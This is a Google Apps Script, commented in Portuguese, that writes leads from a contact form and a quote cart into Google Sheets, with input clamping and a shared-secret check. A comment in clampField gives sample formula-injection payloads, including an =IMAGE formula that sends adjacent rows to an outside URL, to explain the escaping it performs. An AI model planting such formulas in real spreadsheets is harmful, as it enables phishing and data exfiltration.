// BGA Lead Tracker — Google Apps Script  ·  v6 (2026-09-14)
// Cole em: script.google.com → seu projeto → Code.gs
// Implantar → Gerenciar implantações → Editar (lápis) → Nova versão → Implantar
//
// MUDANÇA DA v6: coluna "WhatsApp" nova no FIM de Cotizaciones (21ª, U) — campo
// opcional do carrinho de cotação, só nesse formulário (doGet/aba de contato
// não mudam). Pelo mesmo motivo das v3/v5: vai no fim, não no meio, porque
// Estado é a 12ª coluna e uma inserção no meio já quebrou essa contagem antes.
//
// MUDANÇA DA v5 (medição de campanha): 5 colunas novas no FIM das duas
// planilhas — Fuente, Medio, Campaña, Click ID, Página de entrada — vindas de
// lib/attribution.js (captura de utm_*/gclid/fbclid no navegador). Vão no
// fim, não no meio, pelo mesmo motivo documentado na mudança da v3 abaixo:
// Estado é a 12ª coluna e uma inserção no meio já quebrou essa contagem uma
// vez. ATENÇÃO — passo manual fora do código: uma planilha criada ANTES desta
// mudança mantém a linha de cabeçalho antiga. Sem adicionar as 5 colunas à
// mão na aba existente, os valores novos gravam sob cabeçalhos em branco.
//
// MUDANÇA DA v4 (auditoria pré-deploy): `clampField` agora neutraliza fórmula.
// Antes, o texto do visitante ia cru pro `appendRow` e o Sheets o avaliava —
// injeção de fórmula na planilha que a Aida abre. Vale pros DOIS formulários
// (home e carrinho), porque os dois passam por aqui. Ver item 34 do
// docs/BUGS-carrinho-2026-08-29.md. Também entrou um teto de itens no doPost.
//
// MUDANÇA DA v3: campo "Ciudad" novo em doGet e doPost — opcional em ambos,
// nunca entra na guarda de bad_request. Isso deslocou em uma coluna tudo que
// vinha depois dele: Estado (Cotizaciones) agora é a 12ª coluna, não a 11ª.
//
// DUAS ENTRADAS, UMA PLANILHA:
//   doGet  → formulário de contato da landing page  → primeira aba (como antes)
//   doPost → carrinho de cotação do catálogo        → aba "Cotizaciones"
//
// SEGURANÇA:
// 1. Configurações do projeto → Propriedades do script → adicionar:
//      Propriedade: LEAD_FORM_SECRET   Valor: (string longa aleatória)
// 2. O mesmo valor vai em client.config.js (leadWebhookSecret) e no index.html
//    da LP estática. Enquanto LEAD_FORM_SECRET estiver vazio, requisições
//    passam sem ?key= (compatibilidade). Isso não é segredo de verdade — ele
//    fica visível no navegador. É trava contra robô, não contra pessoa.
//
// MUDANÇA IMPORTANTE EM RELAÇÃO À v1:
//   doGet usava getActiveSheet(). Ao criar a aba "Cotizaciones", "ativa" podia
//   passar a ser a aba errada e os leads da home cairiam no lugar errado.
//   Agora doGet grava explicitamente em getSheets()[0] e "Cotizaciones" é
//   sempre inserida no fim.

var LIMITS = { nombre: 120, empresa: 120, sector: 80, mensaje: 4000, atribucion: 200 };

var MAX_ITEMS = 200;

var TAB_COTIZACIONES = 'Cotizaciones';

var HEADERS_COTIZACIONES = [
  'Fecha', 'Nombre', 'RUC / Empresa', 'Ciudad', 'Rubro',
  'Ítems', 'Cant. total', 'SKUs', 'Obra', 'Plazo', 'Origen',
  'Estado', 'Contactado el', 'Propuesta el', 'Notas',
  'Fuente', 'Medio', 'Campaña', 'Click ID', 'Página de entrada',
  'WhatsApp'
];

var ESTADOS = ['nuevo', 'contactado', 'propuesta', 'cerrado', 'perdido'];

// ── Landing page (inalterado, exceto a aba explícita) ────────────────────────

function doGet(e) {
  if (!autorizado_(e.parameter.key)) return jsonOut({ status: 'forbidden' });

  var nombre  = clampField(e.parameter.nombre, LIMITS.nombre);
  var empresa = clampField(e.parameter.empresa, LIMITS.empresa);
  var ciudad  = clampField(e.parameter.ciudad, LIMITS.empresa);
  var sector  = clampField(e.parameter.sector, LIMITS.sector);
  var mensaje = clampField(e.parameter.mensaje, LIMITS.mensaje);

  // Origem da visita — opcional, mesmo motivo de Ciudad: nunca entra na
  // guarda de bad_request. Vem de lib/attribution.js via LandingPage.jsx.
  var fuente   = clampField(e.parameter.fuente, LIMITS.atribucion);
  var medio    = clampField(e.parameter.medio, LIMITS.atribucion);
  var campana  = clampField(e.parameter.campana, LIMITS.atribucion);
  var clickId  = clampField(e.parameter.click_id, LIMITS.atribucion);
  var entrada  = clampField(e.parameter.pagina_entrada, LIMITS.atribucion);

  // Ciudad é opcional: não entra na guarda. Rejeitar o que o formulário aceita
  // seria falha silenciosa — o dado que existe se perderia sem aviso.
  if (!nombre || !empresa || !sector || !mensaje) {
    return jsonOut({ status: 'bad_request' });
  }

  var sheet = SpreadsheetApp.getActiveSpreadsheet().getSheets()[0];

  if (sheet.getLastRow() === 0) {
    var headers = ['Fecha', 'Nombre', 'Empresa', 'Ciudad', 'Rubro', 'Mensaje',
      'Fuente', 'Medio', 'Campaña', 'Click ID', 'Página de entrada'];
    sheet.appendRow(headers);
    sheet.getRange(1, 1, 1, headers.length).setFontWeight('bold');
    sheet.setFrozenRows(1);
  }

  sheet.appendRow([new Date(), nombre, empresa, ciudad, sector, mensaje,
    fuente, medio, campana, clickId, entrada]);
  return jsonOut({ status: 'ok' });
}

// ── Catálogo: carrinho de cotação ────────────────────────────────────────────

function doPost(e) {
  var data;
  try {
    data = JSON.parse(e.postData.contents);
  } catch (err) {
    return jsonOut({ status: 'bad_json' });
  }

  if (!autorizado_(data.key)) return jsonOut({ status: 'forbidden' });

  var items = Array.isArray(data.items) ? data.items : [];
  if (!items.length) return jsonOut({ status: 'bad_request' });

  // Teto de itens. O carrinho real não chega perto disto; um POST forjado com
  // 100 mil linhas chegaria, e o custo cai na cota diária do Apps Script da
  // conta da BGA — cota estourada = lead real deixa de gravar, em silêncio,
  // porque o `no-cors` do site esconde a falha.
  if (items.length > MAX_ITEMS) items = items.slice(0, MAX_ITEMS);

  var sheet = abaCotizaciones_();

  var linhas = items.map(function (it) {
    var obs = it.observacion ? ' (' + it.observacion + ')' : '';
    return '• ' + it.sku + ' — ' + it.nombre + ' · ' + it.cantidad + ' un' + obs;
  }).join('\n');

  var total = items.reduce(function (soma, it) {
    return soma + (Number(it.cantidad) || 0);
  }, 0);

  var skus = items.map(function (it) { return it.sku; }).join(', ');

  sheet.appendRow([
    new Date(),
    clampField(data.nombre, LIMITS.nombre),
    clampField(data.empresa, LIMITS.empresa),
    clampField(data.ciudad, LIMITS.empresa),
    clampField(data.rubro, LIMITS.sector),
    clampField(linhas, LIMITS.mensaje),
    total,
    clampField(skus, LIMITS.mensaje),
    clampField(data.proyecto, LIMITS.empresa),
    clampField(data.plazo, LIMITS.sector),
    clampField(data.origen || 'catalogo', 40),
    'nuevo',
    '', '', '',
    // Origem da visita — vem de lib/attribution.js via app/cotacao/page.jsx.
    clampField(data.fuente, LIMITS.atribucion),
    clampField(data.medio, LIMITS.atribucion),
    clampField(data.campana, LIMITS.atribucion),
    clampField(data.click_id, LIMITS.atribucion),
    clampField(data.pagina_entrada, LIMITS.atribucion),
    clampField(data.whatsapp, LIMITS.atribucion)
  ]);

  return jsonOut({ status: 'ok' });
}

// ── Auxiliares ───────────────────────────────────────────────────────────────

function abaCotizaciones_() {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var sheet = ss.getSheetByName(TAB_COTIZACIONES);

  if (!sheet) {
    sheet = ss.insertSheet(TAB_COTIZACIONES, ss.getNumSheets());
  }

  if (sheet.getLastRow() === 0) {
    sheet.appendRow(HEADERS_COTIZACIONES);
    sheet.getRange(1, 1, 1, HEADERS_COTIZACIONES.length).setFontWeight('bold');
    sheet.setFrozenRows(1);

    // Coluna Estado (12ª, desde que "Ciudad" entrou na 4ª) com lista suspensa
    // — é o que faz a métrica de processo existir: pedidos completos,
    // completados pela vendedora, perdidos.
    var regra = SpreadsheetApp.newDataValidation()
      .requireValueInList(ESTADOS, true)
      .setAllowInvalid(false)
      .build();
    sheet.getRange(2, 12, 2000, 1).setDataValidation(regra);

    sheet.setColumnWidth(6, 320);  // Ítems
    sheet.setColumnWidth(8, 200);  // SKUs
  }

  return sheet;
}

function autorizado_(chave) {
  var secret = PropertiesService.getScriptProperties().getProperty('LEAD_FORM_SECRET');
  if (!secret) return true;          // ainda não configurado: modo legado
  return chave === secret;
}

function clampField(raw, maxLen) {
  var s = String(raw == null ? '' : raw).trim();
  if (s.length > maxLen) s = s.substring(0, maxLen);

  // Neutraliza fórmula. O Sheets avalia como fórmula qualquer célula cujo texto
  // comece com = + - @ (ou tab/CR), e tudo que chega aqui é texto digitado por
  // visitante. Sem isto, =HYPERLINK("https://sitio-falso.py";"Ver cotización")
  // no campo Nombre vira um link de aparência nativa na planilha que a Aida abre,
  // e =IMAGE("https://.../x?d="&A2) manda as linhas vizinhas pra fora.
  // O apóstrofo é o marcador de texto do Sheets: não aparece na célula.
  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;

  return s;
}

function jsonOut(obj) {
  return ContentService
    .createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}
